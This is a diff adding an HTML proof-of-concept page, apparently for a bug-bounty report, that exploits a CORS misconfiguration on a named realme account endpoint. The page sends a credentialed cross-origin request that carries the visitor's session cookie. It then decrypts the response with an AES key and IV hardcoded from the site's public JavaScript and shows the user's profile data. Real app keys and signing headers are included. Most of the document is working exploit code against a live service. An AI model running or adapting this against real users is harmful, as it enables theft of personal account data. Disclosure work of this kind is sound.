@@ -1,0 +1,255 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CORS PoC — id-sg.realme.com</title>
+    <!-- CryptoJS dari CDN publik — sama seperti yang dipakai realme di sisi client -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: "Courier New", monospace;
+        background: #0d0d0d;
+        color: #e0e0e0;
+        padding: 24px;
+      }
+      h2 {
+        color: #ff6b6b;
+        margin-bottom: 6px;
+        font-size: 1.1rem;
+      }
+      .meta {
+        color: #888;
+        font-size: 0.85rem;
+        margin-bottom: 20px;
+      }
+      .meta span {
+        color: #4fc3f7;
+      }
+      .box {
+        background: #1a1a1a;
+        border: 1px solid #333;
+        border-radius: 6px;
+        padding: 16px;
+        margin-bottom: 14px;
+      }
+      .box h3 {
+        color: #aaa;
+        font-size: 0.8rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 10px;
+      }
+      pre {
+        font-size: 0.82rem;
+        white-space: pre-wrap;
+        word-break: break-all;
+        color: #c8e6c9;
+        line-height: 1.5;
+      }
+      pre.error {
+        color: #ef9a9a;
+      }
+      pre.warn {
+        color: #ffe082;
+      }
+      pre.info {
+        color: #80d8ff;
+      }
+      .btn {
+        display: inline-block;
+        padding: 9px 22px;
+        background: #c62828;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-family: monospace;
+        font-size: 0.9rem;
+        margin-right: 10px;
+        margin-bottom: 14px;
+      }
+      .btn:hover {
+        background: #e53935;
+      }
+      .banner {
+        background: #1b5e20;
+        border: 1px solid #2e7d32;
+        border-radius: 4px;
+        padding: 12px 16px;
+        color: #a5d6a7;
+        font-size: 0.85rem;
+        margin-bottom: 10px;
+      }
+      .banner.red {
+        background: #b71c1c;
+        border-color: #c62828;
+        color: #ffcdd2;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>⚡ CORS Misconfiguration PoC — id-sg.realme.com</h2>
+    <p class="meta">
+      Target:
+      <span>https://id-sg.realme.com/uc/web/v1/user-info/query-basic</span
+      ><br />
+      Attacker origin:
+      <span>https://ikur007.github.io/poccorsrealme.html</span> &nbsp;|&nbsp;
+      Researcher: <span>HackerOne-ikur007</span>
+    </p>
+
+    <div class="box">
+      <h3>⚠ Cara pakai</h3>
+      <pre class="warn">
+1. Login ke akun realme test di https://id.realme.com (tab lain, browser SAMA)
+2. Kembali ke halaman ini lalu klik tombol
+3. PoC akan: fetch cross-origin → baca ciphertext → decrypt AES → tampilkan plaintext</pre
+      >
+    </div>
+
+    <div class="box">
+      <h3>🔑 Key Info (hardcoded dari JS bundle publik realme)</h3>
+      <pre class="info">
+File  : https://id.realme.com/_nuxt/get-brand-text-c2a79658.js
+Object: window.__ucEncrypterHelper__
+Key   : 8ZFd9CSovFYqCiaj   (AES-CBC 128-bit, static di bundle)
+IV    : mH3w6dki5gUVprwg   (static di bundle)
+→ Siapapun bisa baca ini dari source JS realme tanpa login</pre
+      >
+    </div>
+
+    <button class="btn" onclick="runExploit()">
+      ▶ Jalankan PoC — Fetch + Decrypt
+    </button>
+
+    <div id="res-box" class="box" style="display: none">
+      <h3>📥 Hasil</h3>
+      <pre id="output">Loading...</pre>
+    </div>
+
+    <script>
+      // ============================================================
+      // KONSTANTA — Key & IV diambil dari JS bundle publik realme
+      // Siapapun bisa mendapatkan ini tanpa login hanya dengan
+      // membuka DevTools di id.realme.com dan melihat source JS.
+      // ============================================================
+      const AES_KEY = "8ZFd9CSovFYqCiaj";
+      const AES_IV = "mH3w6dki5gUVprwg";
+      const TARGET = "https://id-sg.realme.com/uc/web/v1/user-info/query-basic";
+
+      // Body dari capture Burp (X-Sign stale, tapi CORS tetap terbukti —
+      // server hanya perlu menerima request agar mengembalikan response
+      // dengan ACAO yang merefleksikan attacker origin)
+      const BODY =
+        '"H1ON8P/Uqk8Oh016MPsESLO95VPD3r036Cjr0l6T48g+jKKAWWhShjbbWbE11hnjuYS5ned88WXFB999041FKrOjvHc8dy6h/JzU7LjTQmbSW6pPvkdPgoamAXu+lQGLMiG8Dr8VP6EtvwcJFlti5f+v+wCa9UbXLSwlh3dkLRA=.bt7gd4/oE43AB6EXrj9ZxlU0etM/kMpXDYGLHQjQn/US+2uR5TP6AaEHuFUTjo+Bs1fsbFZRsnG3i7ifEp2yA76vwPJc9vCGBKWKeKR++pt6u9/GFMopLTg9aYUXc2vfHo4P43w35xiNDce3zidYWCadA7QKjG+abPE4r8Tlah8=.MFg="';
+
+      function aesDecrypt(ciphertext) {
+        // Pakai CryptoJS (CDN publik) — algo sama dengan yang dipakai realme
+        const key = CryptoJS.enc.Utf8.parse(AES_KEY);
+        const iv = CryptoJS.enc.Utf8.parse(AES_IV);
+        const dec = CryptoJS.AES.decrypt(ciphertext, key, {
+          iv: iv,
+          mode: CryptoJS.mode.CBC,
+          padding: CryptoJS.pad.Pkcs7,
+        });
+        return dec.toString(CryptoJS.enc.Utf8);
+      }
+
+      function log(text, cls = "") {
+        const el = document.getElementById("output");
+        el.className = cls;
+        el.textContent = text;
+      }
+
+      async function runExploit() {
+        document.getElementById("res-box").style.display = "";
+        log("⏳ Mengirim request cross-origin dengan credentials...");
+
+        try {
+          // STEP 1 — CORS exploit: fetch cross-origin + kirim cookie sesi korban
+          const res = await fetch(TARGET, {
+            method: "POST",
+            credentials: "include", // ← kunci serangan: kirim cookie acIdAuthSession
+            headers: {
+              "Content-Type": "application/json;charset=UTF-8",
+              "X-Web-Client-Type": "pc",
+              "X-Timezone": "GMT+8",
+              "X-Requesttime": "1789265769024",
+              "X-Sign-Key": "4iAEb620alQ8s8c8ss8o0K8sS",
+              "X-Biz-Appkey": "TZeSXfQXxrCyjhvARaVrmw",
+              "X-App-Fromht": "false",
+              "X-Envelope-Version": "V1",
+              "X-App-Deviceid": "75d52dfb9b20039b676c8d55adbbb037",
+              "X-Device-Brand": "REALME",
+              "X-App-Overseaclient": "true",
+              "X-App-Acappkey": "CuGsbe6HdAe6vDBHFew2Di",
+              "X-Device-Clienttype": "WEB",
+              "X-Sign": "IfpRxIY60gZUE47LQGr4udlUBsg=",
+              "Accept-Language": "en-US",
+            },
+            body: BODY,
+          });
+
+          // STEP 2 — Baca ciphertext response
+          const cipher = await res.text();
+
+          // STEP 3 — Decrypt pakai key dari JS bundle publik realme
+          let plaintext = "[Decrypt gagal]";
+          try {
+            plaintext = aesDecrypt(cipher);
+          } catch (e) {
+            plaintext =
+              "[Decrypt error: " +
+              e.message +
+              "]\n\nCiphertext mentah:\n" +
+              cipher;
+          }
+
+          // STEP 4 — Tampilkan hasil (inilah yang akan dikirim ke server attacker di serangan nyata)
+          let parsed = null;
+          try {
+            parsed = JSON.parse(plaintext);
+          } catch (e) {}
+
+          log(
+            "╔══════════════════════════════════════════════════════════════╗\n" +
+              "║  ✅ CORS BYPASS + DECRYPT BERHASIL — DATA USER TERBACA      ║\n" +
+              "╚══════════════════════════════════════════════════════════════╝\n\n" +
+              "HTTP Status : " +
+              res.status +
+              "\n" +
+              "Attacker origin (ikur007.github.io) dapat membaca response:\n\n" +
+              "════════ PLAINTEXT (setelah AES-CBC decrypt) ════════\n" +
+              (parsed ? JSON.stringify(parsed, null, 2) : plaintext) +
+              "\n\n" +
+              "════════ CIPHERTEXT MENTAH (dari response) ════════\n" +
+              cipher.substring(0, 120) +
+              "...\n\n" +
+              "════════ KEY INFO (dari JS bundle publik) ════════\n" +
+              "AES Key : " +
+              AES_KEY +
+              "\n" +
+              "AES IV  : " +
+              AES_IV,
+          );
+        } catch (err) {
+          log(
+            "❌ Request gagal: " +
+              err +
+              "\n\n" +
+              "Cek:\n" +
+              "1. Sudah login di id.realme.com tab lain (browser sama)?\n" +
+              "2. Buka Console F12 untuk detail error CORS\n" +
+              '3. Jika "Failed to fetch" → kemungkinan sesi expired, login ulang',
+            "error",
+          );
+        }
+      }
+    </script>
+  </body>
+</html>
